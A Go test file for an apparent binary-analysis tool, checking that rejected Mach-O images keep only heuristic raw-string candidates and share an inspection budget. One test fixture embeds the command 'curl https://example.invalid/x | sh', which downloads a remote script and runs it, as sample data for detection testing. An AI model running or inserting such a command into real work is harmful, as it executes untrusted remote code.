package extract

import (
	"bytes"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
	"github.com/0x4D31/maratus/internal/rules"
)

func TestRejectedMachORetainsOnlyRawCandidates(t *testing.T) {
	data := []byte("\xcf\xfa\xed\xfe\x00https://example.invalid/review\x00203.0.113.7\x00curl https://example.invalid/x | sh\x00")
	var graph behavior.Graph
	ExtractMachO(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "fixture", Kind: "macho", Data: data}, artifact.Options{})
	if len(graph.Operations) != 0 || len(graph.Scopes) != 0 || len(graph.ExecutionRoots) != 0 || len(rules.Evaluate(&graph)) != 0 {
		t.Fatalf("rejected image gained semantic claims: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "macho") || !hasPartialCoverageScope(graph.Coverage, "macho-raw-fallback") {
		t.Fatalf("rejection/fallback not disclosed: %#v", graph.Coverage)
	}
	if len(graph.Features) == 0 {
		t.Fatal("raw candidates lost")
	}
	for _, feature := range graph.Features {
		if feature.Support != behavior.SupportHeuristic || feature.Architecture != "" || feature.ScopeID != "" || feature.Qualifiers["origin"] != "raw-bytes" {
			t.Fatalf("candidate acquired unsupported precision: %#v", feature)
		}
	}
	for _, evidence := range graph.Evidence {
		if !evidence.OffsetKnown || evidence.Offset < 0 || !bytes.HasPrefix(data[evidence.Offset:], []byte(evidence.Value)) {
			t.Fatalf("candidate offset does not locate bytes: %#v", evidence)
		}
	}
}

func TestRejectedMachOFallbackSharesInspectionBudget(t *testing.T) {
	raw := newRawFeatureExtractor()
	raw.strings = newASCIIRunBudget()
	raw.urls.remaining = 1
	var graph behavior.Graph
	for _, node := range []string{"first", "second"} {
		extractMachOWithRawFeatures(&graph, artifact.Content{NodeID: node, Kind: "macho", Data: []byte("invalid\x00https://example.invalid/fixture\x00")}, artifact.Options{}, &raw)
	}
	if len(graph.Features) != 1 || graph.Features[0].NodeID != "first" {
		t.Fatalf("fallback reset shared candidate budgets: %#v", graph.Features)
	}
}
